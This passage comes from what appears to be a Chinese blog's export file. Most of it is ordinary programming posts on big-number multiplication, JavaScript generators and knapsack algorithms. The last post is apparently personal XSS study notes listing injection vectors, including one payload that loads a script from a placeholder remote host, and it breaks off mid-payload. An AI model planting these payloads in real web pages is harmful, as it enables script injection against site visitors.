(signed) int value\\n#define INT_MAX       2147483647    // maximum (signed) int value\\n\\n#define LLONG_MAX     9223372036854775807i64       // maximum signed long long int value\\n#define LLONG_MIN   (-9223372036854775807i64 - 1)  // minimum signed long long int value\\n```\\n这时碰见更大数怎么办。这里有一种方法，逐位相乘处理进位法.\\n<pre class=\\\"brush:cpp;\\\" >\\nclass Solution2 {\\npublic:\\n\\tstring multiply(string num1, string num2) {\\n\\n\\t\\treverse(num1.begin(), num1.end());\\n\\t\\treverse(num2.begin(), num2.end());\\n\\n\\t\\tint l1 = num1.size();\\n\\t\\tint l2 = num2.size();\\n\\t\\tstring res(l1 + l2 + 1, '0');\\n\\t\\tint carr = 0, t, idx;\\n\\t\\tfor (int i = 0; i < l1; ++i)\\n\\t\\t{\\n\\t\\t\\tint n1 = num1[i] - '0';\\n\\t\\t\\tcarr = 0;\\n\\t\\t\\tfor (int j = 0; j < l2; ++j)\\n\\t\\t\\t{\\n\\t\\t\\t\\tt = carr + n1 * (num2[j] - '0') + (res[i + j] - '0');\\n\\t\\t\\t\\tcarr = t / 10;\\n\\t\\t\\t\\tres[i + j] = t % 10 + '0';\\n\\t\\t\\t}\\n\\t\\t\\tidx = l2;\\n\\t\\t\\twhile (carr != 0)\\n\\t\\t\\t\\tif (carr != 0) {\\n\\t\\t\\t\\t\\tt = carr + (res[i + idx] - '0');\\n\\t\\t\\t\\t\\tcarr = t / 10;\\n\\t\\t\\t\\t\\tres[i + idx++] = t % 10 + '0';\\n\\t\\t\\t\\t}\\n\\t\\t}\\n\\t\\twhile (!res.empty() && res.back() == '0') res.pop_back();\\n\\t\\tif (res.empty()) return \\\"0\\\";\\n\\t\\treverse(res.begin(), res.end());\\n\\t\\treturn res;\\n\\t}\\n};\\n</pre>\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>在计算机中，int只有32位，long long也就64位。</p>\n<pre><code>#define INT_MIN     (-2147483647 - 1) // minimum (signed) int value\n#define INT_MAX       2147483647    // maximum (signed) int value\n\n#define LLONG_MAX     9223372036854775807i64       // maximum signed long long int value\n#define LLONG_MIN   (-9223372036854775807i64 - 1)  // minimum signed long long int value\n</code></pre>\n<p>这时碰见更大数怎么办。这里有一种方法，逐位相乘处理进位法.</p>\n<pre class=\"brush:cpp;\" >\nclass Solution2 {\npublic:\n\tstring multiply(string num1, string num2) {\n\n\t\treverse(num1.begin(), num1.end());\n\t\treverse(num2.begin(), num2.end());\n\n\t\tint l1 = num1.size();\n\t\tint l2 = num2.size();\n\t\tstring res(l1 + l2 + 1, '0');\n\t\tint carr = 0, t, idx;\n\t\tfor (int i = 0; i < l1; ++i)\n\t\t{\n\t\t\tint n1 = num1[i] - '0';\n\t\t\tcarr = 0;\n\t\t\tfor (int j = 0; j < l2; ++j)\n\t\t\t{\n\t\t\t\tt = carr + n1 * (num2[j] - '0') + (res[i + j] - '0');\n\t\t\t\tcarr = t / 10;\n\t\t\t\tres[i + j] = t % 10 + '0';\n\t\t\t}\n\t\t\tidx = l2;\n\t\t\twhile (carr != 0)\n\t\t\t\tif (carr != 0) {\n\t\t\t\t\tt = carr + (res[i + idx] - '0');\n\t\t\t\t\tcarr = t / 10;\n\t\t\t\t\tres[i + idx++] = t % 10 + '0';\n\t\t\t\t}\n\t\t}\n\t\twhile (!res.empty() && res.back() == '0') res.pop_back();\n\t\tif (res.empty()) return \"0\";\n\t\treverse(res.begin(), res.end());\n\t\treturn res;\n\t}\n};\n</pre>\n<!--kg-card-end: markdown-->","comment_id":"71","plaintext":"在计算机中，int只有32位，long long也就64位。\n\n#define INT_MIN     (-2147483647 - 1) // minimum (signed) int value\n#define INT_MAX       2147483647    // maximum (signed) int value\n\n#define LLONG_MAX     9223372036854775807i64       // maximum signed long long int value\n#define LLONG_MIN   (-9223372036854775807i64 - 1)  // minimum signed long long int value\n\n\n这时碰见更大数怎么办。这里有一种方法，逐位相乘处理进位法.\n\n\nclass Solution2 {\npublic:\n\tstring multiply(string num1, string num2) {\n\n\t\treverse(num1.begin(), num1.end());\n\t\treverse(num2.begin(), num2.end());\n\n\t\tint l1 = num1.size();\n\t\tint l2 = num2.size();\n\t\tstring res(l1 + l2 + 1, '0');\n\t\tint carr = 0, t, idx;\n\t\tfor (int i = 0; i < l1; ++i)\n\t\t{\n\t\t\tint n1 = num1[i] - '0';\n\t\t\tcarr = 0;\n\t\t\tfor (int j = 0; j < l2; ++j)\n\t\t\t{\n\t\t\t\tt = carr + n1 * (num2[j] - '0') + (res[i + j] - '0');\n\t\t\t\tcarr = t / 10;\n\t\t\t\tres[i + j] = t % 10 + '0';\n\t\t\t}\n\t\t\tidx = l2;\n\t\t\twhile (carr != 0)\n\t\t\t\tif (carr != 0) {\n\t\t\t\t\tt = carr + (res[i + idx] - '0');\n\t\t\t\t\tcarr = t / 10;\n\t\t\t\t\tres[i + idx++] = t % 10 + '0';\n\t\t\t\t}\n\t\t}\n\t\twhile (!res.empty() && res.back() == '0') res.pop_back();\n\t\tif (res.empty()) return \"0\";\n\t\treverse(res.begin(), res.end());\n\t\treturn res;\n\t}\n};","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-10-14T08:56:58.000Z","created_by":"1","updated_at":"2016-10-14T09:05:49.000Z","updated_by":"1","published_at":"2016-10-14T09:02:37.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d305","uuid":"f87b36cd-97ad-46fa-9d68-281b91b418e0","title":"Generator妙用","slug":"generatormiao-yong","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"传统的编程语言，早有异步编程的解决方案。其中有一种叫做\\\"协程\\\"（coroutine），意思是多个线程互相协作，完成异步任务。\\n\\nGenerator 函数是协程在 ES6 的实现，最大特点就是可以交出函数的执行权（即暂停执行）\\n<pre class=\\\"brush:js;\\\" >\\nfunction* gen(x){\\n   var y = yield x + 2;\\n   var z = yield y + 2;\\n   return z\\n}\\nvar g = gen(1);\\nvar a=g.next();//运行到,第一个yield处，交出函数的执行权，并返回x+2=3，\\nvar b=g.next(a.value);//要记得把a.value传进去，继续执行赋值语句，此时，yield x + 2 已经被替换成传入a.value,然后同上，运行到yield，交出函数的执行权，并返回yield后面的表达式\\nvar c=g.next();//这里要是不传入参数，则z等undefined,运行到最后，返回undefined\\n</pre>\\n\\nGenerator 函数有这样的特效，因此可以把一些异步的函数改变成同步的执行。[co最简版实现](https://cnodejs.org/topic/53474cd19e21582e740117df)， yeild后面只支持thunk。\\n<pre class=\\\"brush:js;\\\" >\\nfunction co(generator) {\\n  return function(fn) {\\n    var gen = generator();\\n    function next(err, result) {\\n        if(err){\\n            return fn(err);\\n        }\\n        var step = gen.next(result);\\n        if (!step.done) {\\n            step.value(next);\\n        } else {\\n            fn(null, step.value);\\n        }\\n    }\\n    next();\\n   }\\n}\\n// wrap the function to thunk\\nfunction readFile(filename) {\\n    return function(callback) {\\n        require('fs').readFile(filename, 'utf8', callback);\\n    };\\n}\\n\\nco(function * () {\\n    var file1 = yield readFile('./file/a.txt');\\n    var file2 = yield readFile('./file/b.txt');\\n\\n    console.log(file1);\\n    console.log(file2);\\n    return 'done';\\n})(function(err, result) {\\n    console.log(result)\\n});\\n</pre>\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>传统的编程语言，早有异步编程的解决方案。其中有一种叫做&quot;协程&quot;（coroutine），意思是多个线程互相协作，完成异步任务。</p>\n<p>Generator 函数是协程在 ES6 的实现，最大特点就是可以交出函数的执行权（即暂停执行）</p>\n<pre class=\"brush:js;\" >\nfunction* gen(x){\n   var y = yield x + 2;\n   var z = yield y + 2;\n   return z\n}\nvar g = gen(1);\nvar a=g.next();//运行到,第一个yield处，交出函数的执行权，并返回x+2=3，\nvar b=g.next(a.value);//要记得把a.value传进去，继续执行赋值语句，此时，yield x + 2 已经被替换成传入a.value,然后同上，运行到yield，交出函数的执行权，并返回yield后面的表达式\nvar c=g.next();//这里要是不传入参数，则z等undefined,运行到最后，返回undefined\n</pre>\n<p>Generator 函数有这样的特效，因此可以把一些异步的函数改变成同步的执行。<a href=\"https://cnodejs.org/topic/53474cd19e21582e740117df\">co最简版实现</a>， yeild后面只支持thunk。</p>\n<pre class=\"brush:js;\" >\nfunction co(generator) {\n  return function(fn) {\n    var gen = generator();\n    function next(err, result) {\n        if(err){\n            return fn(err);\n        }\n        var step = gen.next(result);\n        if (!step.done) {\n            step.value(next);\n        } else {\n            fn(null, step.value);\n        }\n    }\n    next();\n   }\n}\n// wrap the function to thunk\nfunction readFile(filename) {\n    return function(callback) {\n        require('fs').readFile(filename, 'utf8', callback);\n    };\n}\n\nco(function * () {\n    var file1 = yield readFile('./file/a.txt');\n    var file2 = yield readFile('./file/b.txt');\n\n    console.log(file1);\n    console.log(file2);\n    return 'done';\n})(function(err, result) {\n    console.log(result)\n});\n</pre><!--kg-card-end: markdown-->","comment_id":"72","plaintext":"传统的编程语言，早有异步编程的解决方案。其中有一种叫做\"协程\"（coroutine），意思是多个线程互相协作，完成异步任务。\n\nGenerator 函数是协程在 ES6 的实现，最大特点就是可以交出函数的执行权（即暂停执行）\n\n\nfunction* gen(x){\n   var y = yield x + 2;\n   var z = yield y + 2;\n   return z\n}\nvar g = gen(1);\nvar a=g.next();//运行到,第一个yield处，交出函数的执行权，并返回x+2=3，\nvar b=g.next(a.value);//要记得把a.value传进去，继续执行赋值语句，此时，yield x + 2 已经被替换成传入a.value,然后同上，运行到yield，交出函数的执行权，并返回yield后面的表达式\nvar c=g.next();//这里要是不传入参数，则z等undefined,运行到最后，返回undefined\n\n\nGenerator 函数有这样的特效，因此可以把一些异步的函数改变成同步的执行。co最简版实现\n[https://cnodejs.org/topic/53474cd19e21582e740117df]， yeild后面只支持thunk。\n\n\nfunction co(generator) {\n  return function(fn) {\n    var gen = generator();\n    function next(err, result) {\n        if(err){\n            return fn(err);\n        }\n        var step = gen.next(result);\n        if (!step.done) {\n            step.value(next);\n        } else {\n            fn(null, step.value);\n        }\n    }\n    next();\n   }\n}\n// wrap the function to thunk\nfunction readFile(filename) {\n    return function(callback) {\n        require('fs').readFile(filename, 'utf8', callback);\n    };\n}\n\nco(function * () {\n    var file1 = yield readFile('./file/a.txt');\n    var file2 = yield readFile('./file/b.txt');\n\n    console.log(file1);\n    console.log(file2);\n    return 'done';\n})(function(err, result) {\n    console.log(result)\n});","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-11-18T10:13:51.000Z","created_by":"1","updated_at":"2016-12-06T01:51:19.000Z","updated_by":"1","published_at":"2016-11-18T10:40:13.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d306","uuid":"e3864e9e-7762-455f-a69e-33f9e1c31f20","title":"遗传算法解决01背包问题","slug":"11","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"* 遗传算法\\n```\\nlet w: number[] = [2, 2, 6, 5, 4];\\nlet p: number[] = [6, 3, 5, 4, 6];\\n/**\\n * 返回一个0到a之间整数\\n * @param {number} a -整数\\n */\\nfunction randInt(a:number):number{\\n    return Math.round(Math.random()*(a+1));\\n}\\nfunction randClamp(a,b){\\n    return randInt(a-b)+a;\\n}\\nlet geneLen=5;\\nlet max=0;\\n/** \\n * -生物圈\\n*/\\nvar biosphere={\\n    all:[],\\n    initLen:30,\\n    /**\\n     * -初始化\\n     */\\n    init:()=>{\\n        for(let i=0;i<biosphere.initLen;i++){\\n            var temp=[];\\n            for(let j=0;j<geneLen;j++){\\n                if(Math.random()<0.5){\\n                    temp.push(1);\\n                }else{\\n                    temp.push(0);\\n                }  \\n            }\\n            biosphere.all.push(new backpack(temp));\\n        }\\n    },\\n    /**\\n     * -轮盘选择法\\n     */\\n    select:(arr)=>{\\n        let ran=Math.random();\\n        let psum=0;\\n        let index=0;\\n        while(psum<ran){\\n            psum+=arr[index].p;\\n            index+=1;\\n        }\\n        return index-1;\\n    },\\n    /**\\n     * -清除生命为0的\\n     */\\n    clear:()=>{\\n        biosphere.all=biosphere.all.filter((x)=>{\\n            if(x.life==0){\\n                return false\\n            }else{return true;}\\n        })\\n    },\\n    /**\\n     * -迭代\\n     */\\n    iteration:()=>{\\n        biosphere.clear();\\n        let allValue=0;\\n        biosphere.all.forEach((x)=>{\\n          allValue+=x.value;\\n        })\\n        let temp=0;\\n        var arr=biosphere.all.map((x)=>{\\n            temp+=x.value;\\n            x.p=temp/allValue;\\n            return x;\\n        })\\n\\n        biosphere.all=[];\\n        for(let i=0;i<arr.length;i=i+1.5){\\n            let index=biosphere.select(arr);\\n            let index2=biosphere.select(arr);\\n            backpack.mating(arr[index],arr[index2])\\n        }\\n\\n       // biosphere.clear();\\n\\n    }\\n}\\n\\n/**-背包类 */\\nclass backpack \\n{\\n    gene:number[];\\n    mutationRate:number=0.05;\\n    value:number=0;\\n    weight:number=0;\\n    life=1;\\n    MaxWeight=10;\\n    constructor(gene:number[]){\\n        this.gene=gene.map((x)=>{\\n            if(Math.random()<this.mutationRate){\\n                if(x===1){\\n                    return 0;\\n                }else{\\n                    return 1;\\n                }\\n            }else{return x;}\\n        });\\n        this.gene.forEach((x,index)=>{\\n            if(x===1){\\n                this.value+=p[index];\\n                this.weight+=w[index];\\n            }\\n        })\\n        \\n        if(this.weight>this.MaxWeight){\\n            this.life=0;\\n        }else{\\n            if(this.value>max){max=this.value;}\\n        }\\n    }\\n    /**\\n     * 交配函数，需要两个backpa类型，生产2个子代\\n     * @param {backpack} a -backpack类型\\n     * @param {backpack} b -backpack类型\\n     */\\n    static mating(a:backpack,b:backpack){\\n        let start=randInt(a.gene.length);\\n        let end=randInt(a.gene.length);\\n        if(end<start){\\n            let temp;\\n            temp=end;\\n            end=start;\\n            start=temp;\\n        }\\n        biosphere.all.push(new backpack(a.gene.slice(0,start).concat(b.gene.slice(start,end).concat(a.gene.slice(end,a.gene.length)))));\\n        biosphere.all.push(new backpack(b.gene.slice(0,start).concat(a.gene.slice(start,end).concat(b.gene.slice(end,b.gene.length)))))\\n        a.life=0;\\n        b.life=0;\\n    }\\n}\\nbiosphere.init();\\nbiosphere.iteration();\\nbiosphere.iteration();\\nbiosphere.iteration();\\nbiosphere.iteration();\\nbiosphere.iteration();\\nbiosphere.iteration();\\nbiosphere.iteration();\\nbiosphere.iteration();\\nbiosphere.iteration();\\nbiosphere.iteration();\\nbiosphere.iteration();\\nbiosphere.iteration();\\nbiosphere.iteration();\\nbiosphere.iteration();\\nbiosphere.iteration();\\nconsole.log(biosphere,max)\\n\\n```\\n* 动态规划\\n```\\nlet w: number[] = [2, 2, 6, 5, 4];\\nlet p: number[] = [6, 3, 5, 4, 6];\\nlet maxW = 10;\\nfunction run(w, p, maxW) {\\n    let n = w.length;\\n    let res: number[][]=[];\\n    for(let i=0;i<=n;i++){\\n        res.push([])\\n    }\\n    w.unshift(0);\\n    p.unshift(0);\\n    for (let i = 0; i <= n; i++) {\\n        for (let j = 0; j <= maxW; j++) {\\n            if(i==0){\\n                res[0][j]=0;\\n            }else{\\n                if(w[i]>j){\\n                    res[i][j]=res[i-1][j]\\n                }else{\\n                    res[i][j]=Math.max((res[i-1][j-w[i]]+p[i]),res[i-1][j])\\n                }\\n                \\n            }\\n        }\\n    }\\n    console.table(res);\\n}\\nrun(w, p, maxW)\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><ul>\n<li>遗传算法</li>\n</ul>\n<pre><code>let w: number[] = [2, 2, 6, 5, 4];\nlet p: number[] = [6, 3, 5, 4, 6];\n/**\n * 返回一个0到a之间整数\n * @param {number} a -整数\n */\nfunction randInt(a:number):number{\n    return Math.round(Math.random()*(a+1));\n}\nfunction randClamp(a,b){\n    return randInt(a-b)+a;\n}\nlet geneLen=5;\nlet max=0;\n/** \n * -生物圈\n*/\nvar biosphere={\n    all:[],\n    initLen:30,\n    /**\n     * -初始化\n     */\n    init:()=&gt;{\n        for(let i=0;i&lt;biosphere.initLen;i++){\n            var temp=[];\n            for(let j=0;j&lt;geneLen;j++){\n                if(Math.random()&lt;0.5){\n                    temp.push(1);\n                }else{\n                    temp.push(0);\n                }  \n            }\n            biosphere.all.push(new backpack(temp));\n        }\n    },\n    /**\n     * -轮盘选择法\n     */\n    select:(arr)=&gt;{\n        let ran=Math.random();\n        let psum=0;\n        let index=0;\n        while(psum&lt;ran){\n            psum+=arr[index].p;\n            index+=1;\n        }\n        return index-1;\n    },\n    /**\n     * -清除生命为0的\n     */\n    clear:()=&gt;{\n        biosphere.all=biosphere.all.filter((x)=&gt;{\n            if(x.life==0){\n                return false\n            }else{return true;}\n        })\n    },\n    /**\n     * -迭代\n     */\n    iteration:()=&gt;{\n        biosphere.clear();\n        let allValue=0;\n        biosphere.all.forEach((x)=&gt;{\n          allValue+=x.value;\n        })\n        let temp=0;\n        var arr=biosphere.all.map((x)=&gt;{\n            temp+=x.value;\n            x.p=temp/allValue;\n            return x;\n        })\n\n        biosphere.all=[];\n        for(let i=0;i&lt;arr.length;i=i+1.5){\n            let index=biosphere.select(arr);\n            let index2=biosphere.select(arr);\n            backpack.mating(arr[index],arr[index2])\n        }\n\n       // biosphere.clear();\n\n    }\n}\n\n/**-背包类 */\nclass backpack \n{\n    gene:number[];\n    mutationRate:number=0.05;\n    value:number=0;\n    weight:number=0;\n    life=1;\n    MaxWeight=10;\n    constructor(gene:number[]){\n        this.gene=gene.map((x)=&gt;{\n            if(Math.random()&lt;this.mutationRate){\n                if(x===1){\n                    return 0;\n                }else{\n                    return 1;\n                }\n            }else{return x;}\n        });\n        this.gene.forEach((x,index)=&gt;{\n            if(x===1){\n                this.value+=p[index];\n                this.weight+=w[index];\n            }\n        })\n        \n        if(this.weight&gt;this.MaxWeight){\n            this.life=0;\n        }else{\n            if(this.value&gt;max){max=this.value;}\n        }\n    }\n    /**\n     * 交配函数，需要两个backpa类型，生产2个子代\n     * @param {backpack} a -backpack类型\n     * @param {backpack} b -backpack类型\n     */\n    static mating(a:backpack,b:backpack){\n        let start=randInt(a.gene.length);\n        let end=randInt(a.gene.length);\n        if(end&lt;start){\n            let temp;\n            temp=end;\n            end=start;\n            start=temp;\n        }\n        biosphere.all.push(new backpack(a.gene.slice(0,start).concat(b.gene.slice(start,end).concat(a.gene.slice(end,a.gene.length)))));\n        biosphere.all.push(new backpack(b.gene.slice(0,start).concat(a.gene.slice(start,end).concat(b.gene.slice(end,b.gene.length)))))\n        a.life=0;\n        b.life=0;\n    }\n}\nbiosphere.init();\nbiosphere.iteration();\nbiosphere.iteration();\nbiosphere.iteration();\nbiosphere.iteration();\nbiosphere.iteration();\nbiosphere.iteration();\nbiosphere.iteration();\nbiosphere.iteration();\nbiosphere.iteration();\nbiosphere.iteration();\nbiosphere.iteration();\nbiosphere.iteration();\nbiosphere.iteration();\nbiosphere.iteration();\nbiosphere.iteration();\nconsole.log(biosphere,max)\n\n</code></pre>\n<ul>\n<li>动态规划</li>\n</ul>\n<pre><code>let w: number[] = [2, 2, 6, 5, 4];\nlet p: number[] = [6, 3, 5, 4, 6];\nlet maxW = 10;\nfunction run(w, p, maxW) {\n    let n = w.length;\n    let res: number[][]=[];\n    for(let i=0;i&lt;=n;i++){\n        res.push([])\n    }\n    w.unshift(0);\n    p.unshift(0);\n    for (let i = 0; i &lt;= n; i++) {\n        for (let j = 0; j &lt;= maxW; j++) {\n            if(i==0){\n                res[0][j]=0;\n            }else{\n                if(w[i]&gt;j){\n                    res[i][j]=res[i-1][j]\n                }else{\n                    res[i][j]=Math.max((res[i-1][j-w[i]]+p[i]),res[i-1][j])\n                }\n                \n            }\n        }\n    }\n    console.table(res);\n}\nrun(w, p, maxW)\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"73","plaintext":" * 遗传算法\n\nlet w: number[] = [2, 2, 6, 5, 4];\nlet p: number[] = [6, 3, 5, 4, 6];\n/**\n * 返回一个0到a之间整数\n * @param {number} a -整数\n */\nfunction randInt(a:number):number{\n    return Math.round(Math.random()*(a+1));\n}\nfunction randClamp(a,b){\n    return randInt(a-b)+a;\n}\nlet geneLen=5;\nlet max=0;\n/** \n * -生物圈\n*/\nvar biosphere={\n    all:[],\n    initLen:30,\n    /**\n     * -初始化\n     */\n    init:()=>{\n        for(let i=0;i<biosphere.initLen;i++){\n            var temp=[];\n            for(let j=0;j<geneLen;j++){\n                if(Math.random()<0.5){\n                    temp.push(1);\n                }else{\n                    temp.push(0);\n                }  \n            }\n            biosphere.all.push(new backpack(temp));\n        }\n    },\n    /**\n     * -轮盘选择法\n     */\n    select:(arr)=>{\n        let ran=Math.random();\n        let psum=0;\n        let index=0;\n        while(psum<ran){\n            psum+=arr[index].p;\n            index+=1;\n        }\n        return index-1;\n    },\n    /**\n     * -清除生命为0的\n     */\n    clear:()=>{\n        biosphere.all=biosphere.all.filter((x)=>{\n            if(x.life==0){\n                return false\n            }else{return true;}\n        })\n    },\n    /**\n     * -迭代\n     */\n    iteration:()=>{\n        biosphere.clear();\n        let allValue=0;\n        biosphere.all.forEach((x)=>{\n          allValue+=x.value;\n        })\n        let temp=0;\n        var arr=biosphere.all.map((x)=>{\n            temp+=x.value;\n            x.p=temp/allValue;\n            return x;\n        })\n\n        biosphere.all=[];\n        for(let i=0;i<arr.length;i=i+1.5){\n            let index=biosphere.select(arr);\n            let index2=biosphere.select(arr);\n            backpack.mating(arr[index],arr[index2])\n        }\n\n       // biosphere.clear();\n\n    }\n}\n\n/**-背包类 */\nclass backpack \n{\n    gene:number[];\n    mutationRate:number=0.05;\n    value:number=0;\n    weight:number=0;\n    life=1;\n    MaxWeight=10;\n    constructor(gene:number[]){\n        this.gene=gene.map((x)=>{\n            if(Math.random()<this.mutationRate){\n                if(x===1){\n                    return 0;\n                }else{\n                    return 1;\n                }\n            }else{return x;}\n        });\n        this.gene.forEach((x,index)=>{\n            if(x===1){\n                this.value+=p[index];\n                this.weight+=w[index];\n            }\n        })\n        \n        if(this.weight>this.MaxWeight){\n            this.life=0;\n        }else{\n            if(this.value>max){max=this.value;}\n        }\n    }\n    /**\n     * 交配函数，需要两个backpa类型，生产2个子代\n     * @param {backpack} a -backpack类型\n     * @param {backpack} b -backpack类型\n     */\n    static mating(a:backpack,b:backpack){\n        let start=randInt(a.gene.length);\n        let end=randInt(a.gene.length);\n        if(end<start){\n            let temp;\n            temp=end;\n            end=start;\n            start=temp;\n        }\n        biosphere.all.push(new backpack(a.gene.slice(0,start).concat(b.gene.slice(start,end).concat(a.gene.slice(end,a.gene.length)))));\n        biosphere.all.push(new backpack(b.gene.slice(0,start).concat(a.gene.slice(start,end).concat(b.gene.slice(end,b.gene.length)))))\n        a.life=0;\n        b.life=0;\n    }\n}\nbiosphere.init();\nbiosphere.iteration();\nbiosphere.iteration();\nbiosphere.iteration();\nbiosphere.iteration();\nbiosphere.iteration();\nbiosphere.iteration();\nbiosphere.iteration();\nbiosphere.iteration();\nbiosphere.iteration();\nbiosphere.iteration();\nbiosphere.iteration();\nbiosphere.iteration();\nbiosphere.iteration();\nbiosphere.iteration();\nbiosphere.iteration();\nconsole.log(biosphere,max)\n\n\n\n * 动态规划\n\nlet w: number[] = [2, 2, 6, 5, 4];\nlet p: number[] = [6, 3, 5, 4, 6];\nlet maxW = 10;\nfunction run(w, p, maxW) {\n    let n = w.length;\n    let res: number[][]=[];\n    for(let i=0;i<=n;i++){\n        res.push([])\n    }\n    w.unshift(0);\n    p.unshift(0);\n    for (let i = 0; i <= n; i++) {\n        for (let j = 0; j <= maxW; j++) {\n            if(i==0){\n                res[0][j]=0;\n            }else{\n                if(w[i]>j){\n                    res[i][j]=res[i-1][j]\n                }else{\n                    res[i][j]=Math.max((res[i-1][j-w[i]]+p[i]),res[i-1][j])\n                }\n                \n            }\n        }\n    }\n    console.table(res);\n}\nrun(w, p, maxW)","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-11-28T10:40:14.000Z","created_by":"1","updated_at":"2016-11-29T13:43:42.000Z","updated_by":"1","published_at":"2016-11-29T13:37:58.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d307","uuid":"5a719916-fe80-418c-9f08-e5147b0d28bf","title":"XSS笔记","slug":"xssbi-ji","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> XSS标签利用\\n\\n* `<script>`和`<iframe>`\\n\\n  这些标签可以直接执行javascript代码\\n\\n* javascript的伪协议\\n\\n  `<a>`,`<iframe>`\\n\\n``` html\\n<iframe src=\\\"javascript:alert(xss);\\\"></iframe> \\n<a href=\\\"javascript:alert(xss);\\\">xss</a>\\n```\\n\\n* 利用html事件(dom的事件有100多种)\\n\\n  `onload`,`onclick`,`onerror`,`onmousemove`,`onmouseover`等\\n\\n```html\\n  <img src=\\\"xxx.png\\\" onload=\\\"alert('xss')\\\" /> //需要加载成功\\n  <a onclick=\\\"alert('xss')\\\"></a>\\n  <img src=x onerror=s=createElement('script');body.appendChild(s);s.src='http://xxx/xxx.js';>\\n```\\n* Data URI 协议(IE不可用)\\n\\n  `<a>`,`<object>`,`<meta>`\\n\\n```html\\n  <a href=\\\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=\\\">test</a>  \\n  <object data=\\\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=\\\"></object>\\n  <meta HTTP-EQUIV=\\\"refresh\\\" CONTENT=\\\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\\\" /> \\n```\\n* link的href\\n\\n```html\\n  <link rel=\\\"import\\\" href=\\\"https://www.xxx.com/xss\\\"></link> //一个xss页面就行\\n```\\n* 其他\\n\\n   设置cookie：\\n\\n   ```\\n   <META HTTP-EQUIV=\\\"Set-Cookie\\\" Content=\\\"USERID=<SCRIPT>alert('XSS')</SCRIPT>\\\">\\n   ```\\n\\n   ​\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><blockquote>\n<p>XSS标签利用</p>\n</blockquote>\n<ul>\n<li>\n<p><code>&lt;script&gt;</code>和<code>&lt;iframe&gt;</code></p>\n<p>这些标签可以直接执行javascript代码</p>\n</li>\n<li>\n<p>javascript的伪协议</p>\n<p><code>&lt;a&gt;</code>,<code>&lt;iframe&gt;</code></p>\n</li>\n</ul>\n<pre><code class=\"language-html\">&lt;iframe src=&quot;javascript:alert(xss);&quot;&gt;&lt;/iframe&gt; \n&lt;a href=&quot;javascript:alert(xss);&quot;&gt;xss&lt;/a&gt;\n</code></pre>\n<ul>\n<li>\n<p>利用html事件(dom的事件有100多种)</p>\n<p><code>onload</code>,<code>onclick</code>,<code>onerror</code>,<code>onmousemove</code>,<code>onmouseover</code>等</p>\n</li>\n</ul>\n<pre><code class=\"language-html\">  &lt;img src=&quot;xxx.png&quot; onload=&quot;alert('xss')&quot; /&gt; //需要加载成功\n  &lt;a onclick=&quot;alert('xss')&quot;&gt;&lt;/a&gt;\n  &lt;img src=x onerror=s=createElement('script');body.appendChild(s);s.src='http://xxx/xxx.js';&gt;\n</code></pre>\n<ul>\n<li>\n<p>Data URI 协议(IE不可用)</p>\n<p><code>&lt;a&gt;</code>,<code>&lt;object&gt;</code>,<code>&lt;meta&gt;</code></p>\n</li>\n</ul>\n<pre><code class=\"language-html\">  &lt;a href=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=&quot;&gt;test&lt;/a&gt;  \n  &lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=&quot;&gt;&lt;/object&gt;\n  &lt;meta HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot; /&gt; \n</code></pre>\n<ul>\n<li>link的href</li>\n</ul>\n<pre><code class=\"language-html\">  &lt;link rel=&quot;import&quot; href=&quot;https://www.xxx.com/xss&quot;&gt;&lt;/link&gt; //一个xss页面就行\n</code></pre>\n<ul>\n<li>\n<p>其他</p>\n<p>设置cookie：</p>\n<pre><code>&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;&quot;&gt;\n</code></pre>\n<p>​</p>\n</li>\n</ul>\n<!--kg-card-end: markdown-->","comment_id":"74","plaintext":"> XSS标签利用\n\n\n * <script>和<iframe>\n   \n   这些标签可以直接执行javascript代码\n   \n   \n * javascript的伪协议\n   \n   <a>,<iframe>\n   \n   \n\n<iframe src=\"javascript:alert(xss);\"></iframe> \n<a href=\"javascript:alert(xss);\">xss</a>\n\n\n * 利用html事件(dom的事件有100多种)\n   \n   onload,onclick,onerror,onmousemove,onmouseover等\n   \n   \n\n  <img src=\"xxx.png\" onload=\"alert('xss')\" /> //需要加载成功\n  <a onclick=\"alert('xss')\"></a>\n  <img src=x 